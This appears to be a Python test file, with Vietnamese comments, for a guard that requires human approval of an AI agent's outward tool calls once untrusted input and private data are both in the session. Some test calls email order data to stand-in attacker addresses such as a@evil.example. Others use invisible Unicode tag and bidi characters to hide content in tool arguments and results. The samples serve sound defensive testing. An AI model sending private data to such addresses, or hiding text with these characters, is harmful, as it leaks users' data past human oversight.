import json
from dataclasses import dataclass
from anthropic.types import ToolUseBlock
from session_guard import Cap, Denied, Session, Tool, run_tool_uses, strip_hidden, visible

@dataclass
class Ctx:
    user_id: str

def read_email(ctx, folder="inbox"): return [{"from": "la@example.com", "body": "..."}]
def get_orders(ctx): return [{"user": ctx.user_id, "order": "A1"}]
def fetch_url(ctx, url): return "<html>...</html>"
def send_email(ctx, to, body): return {"sent": to}
def create_ticket(ctx, title): return {"id": 7}

TOOLS = [Tool("read_email", Cap.UNTRUSTED | Cap.PRIVATE, read_email),
         Tool("get_orders", Cap.PRIVATE, get_orders),
         Tool("fetch_url", Cap.UNTRUSTED, fetch_url),
         Tool("send_email", Cap.OUTWARD, send_email),
         Tool("create_ticket", Cap.OUTWARD, create_ticket)]

def session(answer=False, seen=Cap(0)):
    asked = []
    def approve(name, shown):
        asked.append((name, shown)); return answer
    return Session(TOOLS, Ctx("u42"), approve, seen=seen), asked

# 1. chỉ PRIVATE + OUTWARD (hai trên ba): không hỏi
s, asked = session()
s.call("get_orders", {}); s.call("send_email", {"to": "u42@shop.vn", "body": "đơn A1"})
assert asked == []

# 2. UNTRUSTED + OUTWARD, không có dữ liệu riêng: không hỏi
s, asked = session()
s.call("fetch_url", {"url": "https://x"}); s.call("create_ticket", {"title": "t"})
assert asked == []

# 3. đủ ba: lời gọi OUTWARD phải được duyệt; từ chối -> Denied, tool không chạy
s, asked = session(answer=False)
s.call("get_orders", {}); s.call("fetch_url", {"url": "https://x"})
try:
    s.call("send_email", {"to": "a@evil.example", "body": "A1"}); raise SystemExit("phải bị chặn")
except Denied: pass
assert asked == [("send_email", '{"body": "A1", "to": "a@evil.example"}')]

# 4. một tool mang cả A và B (đọc email) rồi gửi đi: hỏi; duyệt thì chạy
s, asked = session(answer=True)
s.call("read_email", {})
assert s.call("send_email", {"to": "boss@shop.vn", "body": "tóm tắt"}) == {"sent": "boss@shop.vn"} and len(asked) == 1
# duyệt một lần không mở cửa cho lần sau
s.call("create_ticket", {"title": "x"}); assert len(asked) == 2

# 5. thứ tự không quan trọng: OUTWARD trước, sau đó A+B, lần OUTWARD kế tiếp vẫn bị hỏi
s, asked = session()
s.call("create_ticket", {"title": "x"}); s.call("read_email", {})
assert asked == []
try: s.call("create_ticket", {"title": "y"}); raise SystemExit
except Denied: pass

# 6. tool lạ, tham số thừa (model tự điền danh tính) -> Denied, không chạy
s, asked = session()
for name, args in (("delete_all", {}), ("get_orders", {"user_id": "u1"}), ("get_orders", {"ctx": "x"})):
    try: s.call(name, args); raise SystemExit((name, args))
    except Denied: pass
assert s.call("get_orders", {}) == [{"user": "u42", "order": "A1"}]   # danh tính lấy từ ctx

# 7. ký tự vô hình trong tham số hiện ra khi duyệt
s, asked = session()
s.call("read_email", {})
try: s.call("send_email", {"to": "a@shop.vn", "body": "ok\U000E0073​"})
except Denied: pass
assert asked[0][1] == '{"body": "ok\\u{e0073}\\u{200b}", "to": "a@shop.vn"}', asked
assert visible("tóm tắt\ufe0f") == "tóm tắt\\u{fe0f}"

# 8. với block tool_use của SDK: bị từ chối thành tool_result is_error
s, _ = session()
s.call("read_email", {})
blk = ToolUseBlock(id="toolu_1", type="tool_use", name="send_email", input={"to": "x@evil.example", "body": "b"})
blk2 = ToolUseBlock(id="toolu_2", type="tool_use", name="get_orders", input={})
r1, r2 = run_tool_uses(s, [blk, blk2])
assert r1["is_error"] and r1["tool_use_id"] == "toolu_1" and "không duyệt" in r1["content"], r1
assert "is_error" not in r2 and '"u42"' in r2["content"], r2

# 9. context có sẵn khi mở phiên: người dùng dán email lạ vào tin nhắn (A), phiên đọc đơn (B)
s, asked = session(seen=Cap.UNTRUSTED)
s.call("get_orders", {})
try: s.call("send_email", {"to": "a@evil.example", "body": "A1"}); raise SystemExit
except Denied: pass
assert len(asked) == 1

# 10. cùng một lượt: OUTWARD đứng trước A+B vẫn bị hỏi, vì thuộc tính của cả lượt tính trước
s, asked = session()
blocks = [ToolUseBlock(id="t1", type="tool_use", name="send_email", input={"to": "a@evil.example", "body": "x"}),
          ToolUseBlock(id="t2", type="tool_use", name="read_email", input={})]
r1, r2 = run_tool_uses(s, blocks)
assert r1["is_error"] and "is_error" not in r2 and [a[0] for a in asked] == ["send_email"], (r1, asked)
# lượt chỉ có tool lạ không làm hỏng phép tính
assert run_tool_uses(session()[0], [ToolUseBlock(id="t", type="tool_use", name="nope", input={})])[0]["is_error"]

# 11. kết quả tool bị xoá ký tự ẩn trước khi vào context; chữ có dấu giữ nguyên
def fetch_hidden(ctx, url): return "Giá tốt\U000E0069\U000E0067\u202e nhé"
s = Session([Tool("fetch_url", Cap.UNTRUSTED, fetch_hidden)], Ctx("u"), lambda *a: True)
(r,) = run_tool_uses(s, [ToolUseBlock(id="t", type="tool_use", name="fetch_url", input={"url": "https://x"})])
assert r["content"] == '"Giá tốt nhé"', r
assert strip_hidden("a\U000E0100\U000E01EFb\u2066c") == "abc"
assert visible("x\U000E0100\u202e") == "x\\u{e0100}\\u{202e}"

# 12. tool ném lỗi: block đó thành tool_result is_error không lộ chi tiết lỗi, block sau vẫn chạy
import io, logging
buf = io.StringIO(); logging.getLogger().addHandler(logging.StreamHandler(buf))
def boom(ctx): raise RuntimeError("db password=hunter2 timeout")
s = Session([Tool("boom", Cap.PRIVATE, boom), Tool("get_orders", Cap.PRIVATE, get_orders)], Ctx("u"), lambda *a: True)
r1, r2 = run_tool_uses(s, [ToolUseBlock(id="a", type="tool_use", name="boom", input={}),
                           ToolUseBlock(id="b", type="tool_use", name="get_orders", input={})])
assert r1["is_error"] and r1["tool_use_id"] == "a" and "hunter2" not in r1["content"], r1
e1 = json.loads(r1["content"])["error"]
assert e1["code"] == "TOOL_FAILED" and e1["retryable"] is False and "Kiểm tra trạng thái" in e1["message"], e1
assert "is_error" not in r2 and '"A1"' in r2["content"], r2
assert "boom" in buf.getvalue() and "RuntimeError" in buf.getvalue() and "hunter2" not in buf.getvalue(), buf.getvalue()
print("GUARD OK")
